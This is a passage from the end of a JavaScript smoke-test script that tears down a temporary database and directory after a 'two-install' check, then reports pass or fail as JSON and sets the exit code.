    if (createdB) await admin.unsafe(`DROP DATABASE IF EXISTS "${nameB}" WITH (FORCE)`);
    await admin.end({ timeout: 5 });
    if (tmp) await rm(tmp, { recursive: true, force: true });
  }
}

main()
  .then(() => {
    if (failures > 0) {
      log.error({ checks, failures }, 'two-install smoke FAILED');
      process.exit(1);
    }
    console.log(
      JSON.stringify({
        smoke: 'TWO_INSTALL_OK',
        checks,
        knownGaps: Object.keys(KNOWN_GAPS).length,
      }),
    );
    process.exit(0);
  })
  .catch((err) => {
    log.error({ err }, 'two-install smoke crashed');
    process.exit(1);
  });
